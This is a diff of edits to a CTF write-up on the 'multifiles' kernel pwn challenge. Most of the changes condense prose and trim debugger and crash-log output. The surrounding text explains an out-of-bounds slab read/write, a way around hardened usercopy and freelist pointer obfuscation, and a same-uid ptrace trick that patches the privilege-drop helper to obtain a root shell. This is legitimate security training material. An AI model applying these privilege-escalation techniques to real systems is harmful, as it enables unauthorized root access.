@@ -12,7 +12,7 @@ Previously I wrote a writeup on the first kernel challenge from this CTF — if 
 
 This post covers **multifiles**, the second kernel pwn challenge.
 
-Since I'm releasing this writeup a bit late: in Part 1, to cover all the steps required for exploitation, I reimplemented the exploit from scratch in Rust. This time around, given the delay, you'll get a refactored version of the original exploit in C instead.
+Since I'm releasing this a bit late: in Part 1 I reimplemented the exploit from scratch in Rust to cover every step, but this time you'll get a refactored version of the original C exploit instead.
 
 # multifiles
 [download](https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/b01lers.2026/multifiles/multifiles.tar.gz)
@@ -44,17 +44,6 @@ Since I'm releasing this writeup a bit late: in Part 1, to cover all the steps r
 
 4 directories, 19 files
 ```
-README.md
-```Markdown
-# multifiles
-
-build artifacts in `build_out/`
-
-rebuild with `pwn_build.sh`
-
-run challenge with `dev.sh`
-```
-
 Based on `deploy/wrapper.sh`, I assembled a local run script:
 ```sh
 #!/bin/sh
@@ -88,15 +77,6 @@ sh: can't access tty; job control turned off
 
 
 ## Read sources
-```sh
-src
-├── drop_priv.c
-├── initrd_init
-├── kernel-cache-usercopy.diff
-├── kernel.config.fragment
-├── Makefile
-└── multifiles.c
-```
 
 `drop_priv` and `initrd_init` follow the same pattern as Part 1.
 Here we have a target kernel module and a small patch to the kernel itself.
@@ -269,11 +249,6 @@ file_pos_write(file, pos);            // write the (advanced) position back
 
 So the `loff_t *offset` argument handed to the driver is a pointer to a copy of `file->f_pos`, and after the op the kernel writes it back (which is why a normal `read` advances the position). `multifiles_llseek` sets `file->f_pos` directly. Net effect: `lseek()` followed by `read()`/`write()` lets us pick exactly where the driver's copy starts — including the OOB window `[0x80, 0x9f]`.
 
-> **Further reading — VFS `f_pos` / `llseek`:**
-> - [Linux kernel docs — VFS, `struct file_operations`](https://www.kernel.org/doc/html/latest/filesystems/vfs.html) (the `llseek`/`read`/`write` contracts)
-> - [`lseek(2)` man page](https://man7.org/linux/man-pages/man2/lseek.2.html) (userspace semantics, `SEEK_SET`)
-> - [`fs/read_write.c` on Bootlin Elixir](https://elixir.bootlin.com/linux/latest/source/fs/read_write.c) — read `ksys_read`, `file_pos_read`/`file_pos_write`, `vfs_read`, `generic_file_llseek` to see how `f_pos` flows into `*offset`
-
 ## Primitives
 
 **Controlled OOB read/write:**
@@ -335,40 +310,17 @@ int main(void) {
 `multifiles_set_active` is `static` and gets inlined into `multifiles_ioctl`, so there is no standalone symbol to break on. Set a breakpoint at `multifiles_ioctl` (`.text+0x2f0`) and step into the `SET_ACTIVE` branch from the switch.
 
 ```sh
-gef> x/16gx $r12+0x20
+gef> x/4gx $r12+0x20      # MultiFileList->files[]: three objects, 0xa0 apart
 0xffff8880038d7020:     0xffff888003989000      0xffff8880039890a0
 0xffff8880038d7030:     0xffff888003989140      0x0000000000000000
-0xffff8880038d7040:     0x0000000000000000      0x0000000000000000
-0xffff8880038d7050:     0x0000000000000000      0x0000000000000000
-0xffff8880038d7060:     0x0000000000000000      0x0000000000000000
-0xffff8880038d7070:     0x0000000000000000      0x0000000000000000
-0xffff8880038d7080:     0x0000000000000000      0x0000000000000000
-0xffff8880038d7090:     0x0000000000000000      0x0000000000000000
 gef> telescope *(void**)($r12+0x20) -n
       0xffff888003989000|+0x0000|+000: 0x0000000000000001
       0xffff888003989008|+0x0008|+001: 0x7d333a7b66746362 'bctf{:3}a0'
       0xffff888003989010|+0x0010|+002: 0x0000000000003061 ('a0'?)
-      0xffff888003989018|+0x0018|+003: 0x0000000000000000
-      0xffff888003989020|+0x0020|+004: 0x0000000000000000
-      0xffff888003989028|+0x0028|+005: 0x0000000000000000
-      0xffff888003989030|+0x0030|+006: 0x0000000000000000
-      0xffff888003989038|+0x0038|+007: 0x0000000000000000
-      0xffff888003989040|+0x0040|+008: 0x0000000000000000
-      0xffff888003989048|+0x0048|+009: 0x0000000000000000
-      0xffff888003989050|+0x0050|+010: 0x0000000000000000
-      0xffff888003989058|+0x0058|+011: 0x0000000000000000
-      0xffff888003989060|+0x0060|+012: 0x0000000000000000
-      0xffff888003989068|+0x0068|+013: 0x0000000000000000
-      0xffff888003989070|+0x0070|+014: 0x0000000000000000
-      0xffff888003989078|+0x0078|+015: 0x0000000000000000
-      0xffff888003989080|+0x0080|+016: 0x0000000000000000
-      0xffff888003989088|+0x0088|+017: 0x0000000000000000
-      0xffff888003989090|+0x0090|+018: 0x0000000000000000
-      0xffff888003989098|+0x0098|+019: 0x0000000000000000
+      ...
       0xffff8880039890a0|+0x00a0|+020: 0x0000000000000001
       0xffff8880039890a8|+0x00a8|+021: 0x7d333a7b66746362 'bctf{:3}a1'
       0xffff8880039890b0|+0x00b0|+022: 0x0000000000003161 ('a1'?)
-      0xffff8880039890b8|+0x00b8|+023: 0x0000000000000000
       ...
       0xffff888003989140|+0x0140|+040: 0x0000000000000001
       0xffff888003989148|+0x0148|+041: 0x7d333a7b66746362 'bctf{:3}a2'
@@ -391,39 +343,16 @@ Running it instantly panics:
 
 ```sh
 [   12.567074] usercopy: Kernel memory exposure attempt detected from SLUB object 'multifiles_cache' (offset 0, size 64)!
-[   12.568138] ------------[ cut here ]------------
 [   12.568300] kernel BUG at mm/usercopy.c:102!
-[   12.569592] Oops: invalid opcode: 0000 [#1] PREEMPT SMP PTI
-[   12.570619] CPU: 0 UID: 1000 PID: 54 Comm: w Tainted: G           O       6.12.81-dirty #1
-[   12.571082] Tainted: [O]=OOT_MODULE
-[   12.571198] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
 [   12.571507] RIP: 0010:usercopy_abort+0x68/0x80
-[   12.572341] Code: ac 51 48 c7 c2 48 b3 97 ac 41 52 48 c7 c7 58 2d 9c ac 48 0f 45 d6 48 c7 c6 45 09 96 ac 48 89 c1 49 0f 45 f3 e8 f9 27 e9 ff 90 <0f> 0b 49 c7 c1 f8 f4 99 ac 4d 89 ca 4d 89 c8 eb a7 0f 1f 80 00 00
-[   12.572840] RSP: 0018:ffffb6d740173dd0 EFLAGS: 00010246
-[   12.573072] RAX: 000000000000006a RBX: ffffa01ac19ba0a0 RCX: 00000000ffffdfff
-[   12.573194] RDX: 0000000000000000 RSI: ffffb6d740173c88 RDI: 0000000000000001
-[   12.573337] RBP: 0000000000000040 R08: 0000000000009ffb R09: 00000000ffffdfff
-[   12.573559] R10: 00000000ffffdfff R11: ffffffffacc555e0 R12: 0000000000000001
-[   12.573675] R13: ffffa01ac19ba0e0 R14: fffffffffffffff2 R15: ffffb6d740173f08
-[   12.573815] FS:  0000000000409cb8(0000) GS:ffffa01acf800000(0000) knlGS:0000000000000000
-[   12.573935] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[   12.574026] CR2: 000000000040601a CR3: 00000000019a4000 CR4: 00000000003006f0
 [   12.574242] Call Trace:
-[   12.575178]  <TASK>
 [   12.575606]  __check_heap_object+0x7d/0xa0
 [   12.575858]  __check_object_size+0x166/0x2b0
 [   12.575983]  kmem_cache_copy_to_user+0x85/0xe0
 [   12.576196]  multifiles_read+0xa6/0xc0 [multifiles]
 [   12.576675]  vfs_read+0xda/0x350
-[   12.576795]  ksys_read+0x6a/0xf0
 [   12.576868]  do_syscall_64+0x9e/0x1a0
-[   12.577066]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   12.577338] RIP: 0033:0x4042b0
-[   12.578697]  </TASK>
-[   12.578775] Modules linked in: multifiles(O)
-[   12.579623] ---[ end trace 0000000000000000 ]---
 [   12.581620] Kernel panic - not syncing: Fatal exception
-[   12.582376] Kernel Offset: 0x2aa00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
 ```
 
 This is hardened usercopy. Recall the cache is created with `kmem_cache_create_usercopy(..., offsetof(MultiFile, name), USERCOPY_SIZE, ...)` — useroffset `0x10`, usersize `0x90`. Only `[obj+0x10, obj+0xa0)` (`name` + `data`) is allowed to cross the user boundary. `__check_object_size` figures out which slab object our source pointer lands in (the neighbor) and checks the range against *its* usercopy region. Our copy started at `neighbor+0x00`, below `0x10`, so it aborts — "offset 0, size 64".
@@ -561,7 +490,7 @@ One word is one equation in three unknowns — `next`, `s->random`, and `O` (whi
 #### Two cancellations
 
 1. **XOR two words to cancel `random`.** It's one per-cache constant, so `E(A) ^ E(B)` drops it.
-2. **Same-page bswap cancels the page base.** `bswap64(a) ^ bswap64(b) = bswap64(a ^ b)`, and for two freeptr slots on the same 4K page `a ^ b` is just the low-bits *delta* — the page base is identical in both and cancels. We don't know the address, but we know the *"distance"*.
+2. **Same-page bswap cancels the page base.** `bswap64(a) ^ bswap64(b) = bswap64(a ^ b)`, and for two freeptr slots on the same 4K page `a ^ b` is just the low-bits *delta* — the page base is identical in both and cancels. We don't know the address, but we know the *distance*.
 
 #### Layout
 
@@ -724,7 +653,7 @@ Then the handoff. The initrd's `init` is an infinite `while true; do /bin/drop_p
 make_parent_exit_zero();   // ATTACH parent; rax=__NR_exit_group, rdi=0, rip=vdso syscall;ret
 ```
 
-This needs no privileges, which surprised me at first. At this point we're still uid 1000 and so is the parent shell, and same-uid `ptrace` is unprivileged — you only need `CAP_SYS_PTRACE` to attach across a privilege boundary. On top of that this kernel ships without Yama (`CONFIG_SECURITY_YAMA` is unset), so there's no `ptrace_scope` to forbid attaching to an ancestor. If it ever did fail, poking `exit` into the tty with `TIOCSTI` or just `kill`ing the shell would do the same job.
+This needs no privileges: we're still uid 1000, and same-uid `ptrace` is unprivileged (`CAP_SYS_PTRACE` is only for crossing a privilege boundary). The kernel also ships without Yama (`CONFIG_SECURITY_YAMA` unset), so no `ptrace_scope` blocks attaching to an ancestor. If it failed, `TIOCSTI` or just `kill`ing the shell would do the same.
 
 No kernel payload, no `commit_creds`, no KASLR-dependent symbol — just a patched suid-like helper. init respawns the shell through the patched `drop_priv`, and it comes up root:
 
